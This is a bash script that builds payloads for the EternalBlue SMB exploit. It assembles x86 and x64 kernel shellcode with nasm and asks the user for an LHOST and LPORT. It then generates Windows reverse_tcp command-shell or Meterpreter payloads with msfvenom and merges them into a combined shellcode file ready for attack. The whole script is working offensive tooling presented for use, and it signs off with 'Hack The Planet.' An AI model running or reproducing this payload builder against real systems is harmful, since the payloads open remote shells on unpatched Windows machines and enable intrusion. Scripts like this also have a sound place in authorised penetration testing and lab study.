#!/usr/bin/env bash

set -e

# ====================================================================
# Variables
# ====================================================================

shell=('shell' 'meterpreter')
arch=('x86' 'x64')

RED='\e[31;1m'
RED_BLINK='\e[31;5;1m'
GREEN='\e[32;1m'
BLUE='\e[34;1m'
END='\e[m'

# ====================================================================
# Checking dependencies
# ====================================================================

which msfvenom 1>/dev/null

if [[ "$?" == "1" ]];then
    echo "Required to have ${RED}msfvenom${END} program installed!"
    exit 1
fi

# check root user
[[ "$UID" -ne "0" ]] && { echo -e "\nOnly ${RED}root${END}.\n"; exit 1; }

# ====================================================================
# Banner
# ====================================================================

echo -e "${BLUE}
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|
${END}"

# ====================================================================
# Deleting temporary files
# ====================================================================

rm -rf temp*

# ====================================================================
# Compiling assembly code
# ====================================================================

for value in {0,1};do
    echo -ne "${GREEN}[+]${END} Compiling ${arch[$value]} kernel shellcode ..."
    nasm -f bin eternalblue_kshellcode_"${arch[$value]}".asm -o temp_kernel_"${arch[$value]}".bin
    echo -e "[ ${GREEN}OK${END} ]"
done

# ====================================================================
# Generate a reverse shell with msfvenon
# ====================================================================

echo -ne "
kernel shellcode compiled!
would you like to auto generate a reverse shell with msfvenom? (Y/n) "
read -r genMSF

if [[ "${genMSF}" =~ [yY](es)* ]];then
    echo -ne "\n${BLUE}LHOST${END} for reverse connection: "
    read -r ip
    echo -ne "${BLUE}LPORT${END} you want x86 to listen on: "
    read -r portx86
    echo -ne "${BLUE}LPORT${END} you want x64 to listen on: "
    read -r portx64

    echo -ne "\n[ 0 ] Regular cmd shell. \
            \n[ 1 ] Meterpreter shell. \
            \n\n${GREEN}[+]${END} Choose the shell: "
    read -r cmd

    echo -ne "\n[ 0 ] Staged payload. \
           \n[ 1 ] Stageless payload. \
           \n\n${GREEN}[+]${END} Choose the stage: "
    read -r stage

    for value in {0,1};do
        case "${stage}" in
            0)
                case "${arch[$value]}" in
                    "x86")
                        echo -e "${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (staged)... \
                               \nmsfvenom -p windows/${shell[$cmd]}/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST=${ip} LPORT=${portx86}"
                        msfvenom -p windows/"${shell[$cmd]}"/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST="${ip}" LPORT="${portx86}"
                    ;;
                    "x64")
                        echo -e "${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (staged)... \
                               \nmsfvenom -p windows/${shell[$cmd]}/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST=${ip} LPORT=${portx64}"
                        msfvenom -p windows/"${shell[$cmd]}"/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST="${ip}" LPORT="${portx64}"

                    ;;
                    *)
                        echo -e "\n${RED}Invalid option...exiting...${END}\n"
                        exit 1
                esac
            ;;
            1)
                case "${arch[$value]}" in
                    "x86")
                        echo -e "\n${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (stageless)... \
                               \nmsfvenom -p windows/${shell[$cmd]}_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST=${ip} LPORT=${portx86}"
                        msfvenom -p windows/"${shell[$cmd]}"_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST="${ip}" LPORT="${portx86}"
                    ;;
                    "x64")
                        echo -e "\n${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (stageless)... \
                               \nmsfvenom -p windows/${shell[$cmd]}_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST=${ip} LPORT=${portx64}"
                        msfvenom -p windows/"${shell[$cmd]}"_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST="${ip}" LPORT="${portx64}"

                    ;;
                    *)
                        echo -e "\n${RED}Invalid option...exiting...${END}\n"
                        exit 1
                esac
            ;;
            *)
                echo -e "\n${RED}Invalid option...exiting...${END}\n"
                exit 1
        esac
    done

    echo -e "\n${GREEN}[+]${END} MERGING SHELLCODE WOOOO!!!"
    cat temp_kernel_x86.bin temp_msf_x86.bin > "${ip}"_p"${portx86}"_x86.bin
    cat temp_kernel_x64.bin temp_msf_x64.bin > "${ip}"_p"${portx64}"_x64.bin
    python eternalblue_sc_merge.py "${ip}"_p"${portx86}"_x86.bin "${ip}"_p"${portx64}"_x64.bin "${ip}"_p"${portx86}"_p"${portx64}"_all.bin

    echo -e "\nFinished. ${RED_BLINK}Hack The Planet.${END}"

    # Deleting temporary files
    rm -rf temp*
else
    echo "Okay cool, make sure you merge your own shellcode properly :)"
    exit 0
fi
